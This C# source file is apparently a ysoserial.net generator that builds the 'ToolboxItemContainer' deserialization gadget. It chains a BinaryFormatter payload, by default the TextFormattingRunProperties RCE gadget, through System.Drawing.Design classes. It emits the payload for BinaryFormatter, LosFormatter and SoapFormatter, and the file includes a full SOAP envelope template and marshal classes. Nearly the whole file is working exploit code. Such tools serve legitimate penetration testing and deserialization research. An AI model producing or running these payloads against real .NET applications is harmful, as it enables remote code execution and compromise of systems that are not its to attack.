using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class ToolboxItemContainerGenerator : GenericGenerator
    {
        // Yet another Formatter Bridge Gadget with a BinaryFormatter deserialization sink to e.g. trigger known RCE gadgets.
        // System.Drawing.Design.ToolboxItemContainer class implements an inner class ToolboxItemSerializer which triggers
        // a BinaryFormatter.Deserialize(..) during deserialization operating on a stream fetched from an IDataObject class variable _dataObject.

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "LosFormatter", "SoapFormatter" };
        }

        public override string Name()
        {
            return "ToolboxItemContainer";
        }

        public override string Finders()
        {
            return "@frycos";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])SerializeWithNoTest(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs), "binaryformatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new ToolboxItemContainerMarshal(binaryFormatterPayload);
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:ToolboxItemContainer id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Drawing.Design/System.Drawing.Design%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
<TbxIC_DataObjectFormats href=""#ref-3""/>
<TbxIC_DataObjectValues href=""#ref-4""/>
</a1:ToolboxItemContainer>
<SOAP-ENC:Array id=""ref-3"" SOAP-ENC:arrayType=""xsd:string[1]"">
<item id=""ref-5"">CF_TOOLBOXITEMCONTAINER_CONTENTS</item>
</SOAP-ENC:Array>
<SOAP-ENC:Array id=""ref-4"" SOAP-ENC:arrayType=""xsd:anyType[1]"">
<item href=""#ref-6""/>
</SOAP-ENC:Array>
<a1:ToolboxItemContainer_x002B_ToolboxItemSerializer id=""ref-6"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Drawing.Design/System.Drawing.Design%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
<AssemblyName href=""#ref-7""/>
<Stream href=""#ref-8""/>
</a1:ToolboxItemContainer_x002B_ToolboxItemSerializer>
<a3:AssemblyName id=""ref-7"" xmlns:a3=""http://schemas.microsoft.com/clr/ns/System.Reflection"">
<_Name id=""ref-9"">mscorlib</_Name>
<_PublicKeyToken xsi:null=""1""/>
<_CultureInfo>127</_CultureInfo>
<_CodeBase id=""ref-11"">file:///C:/Windows/Microsoft.NET/Framework/v4.0.30319/mscorlib.dll</_CodeBase>
<_HashAlgorithm xsi:type=""a4:AssemblyHashAlgorithm"" xmlns:a4=""http://schemas.microsoft.com/clr/ns/System.Configuration.Assemblies"">SHA1</_HashAlgorithm>
<_HashAlgorithmForControl xsi:type=""a4:AssemblyHashAlgorithm"" xmlns:a4=""http://schemas.microsoft.com/clr/ns/System.Configuration.Assemblies"">None</_HashAlgorithmForControl>
<_StrongNameKeyPair xsi:null=""1""/>
<_Flags xsi:type=""a3:AssemblyNameFlags"" xmlns:a3=""http://schemas.microsoft.com/clr/ns/System.Reflection"">33</_Flags>
</a3:AssemblyName>
<SOAP-ENC:Array id=""ref-8"" xsi:type=""SOAP-ENC:base64"">{b64encoded}</SOAP-ENC:Array>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

    }

    [Serializable]
    public class ToolboxItemContainerMarshal : ISerializable
    {
        public ToolboxItemContainerMarshal(byte[] payload)
        {
            Payload = payload;
        }
        private byte[] Payload { get; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType("System.Drawing.Design.ToolboxItemContainer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"));
            info.AddValue("TbxIC_DataObjectFormats", new string[] { "CF_TOOLBOXITEMCONTAINER_CONTENTS" });
            info.AddValue("TbxIC_DataObjectValues", new object[] { new ToolboxItemSerializerMarshal(Payload) });
        }

        [Serializable]
        private sealed class ToolboxItemSerializerMarshal : ISerializable
        {
            public ToolboxItemSerializerMarshal(byte[] payload)
            {
                Payload = payload;
            }

            private byte[] Payload { get; }
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(Type.GetType("System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"));
                info.AddValue("AssemblyName", typeof(System.Drawing.Design.ToolboxItem).GetType().Assembly.GetName());
                info.AddValue("Stream", Payload);
            }
        }
    }

}
